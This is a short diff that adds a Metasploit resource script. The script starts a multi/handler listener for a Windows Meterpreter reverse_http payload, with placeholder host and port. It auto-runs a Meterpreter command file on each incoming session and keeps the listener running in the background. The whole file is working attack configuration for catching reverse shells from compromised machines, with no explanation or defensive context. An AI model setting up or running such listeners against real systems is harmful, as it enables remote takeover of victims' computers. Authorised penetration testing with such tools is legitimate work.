@@ -1,0 +1,8 @@
+spool msfconsole.log
+set AutoRunScript multi_console_command -rc /root/Desktop/meterpreterCommands.rc
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST [IP ADDRESS]
+set LPORT [PORT]
+set ExitOnSession false
+exploit -j
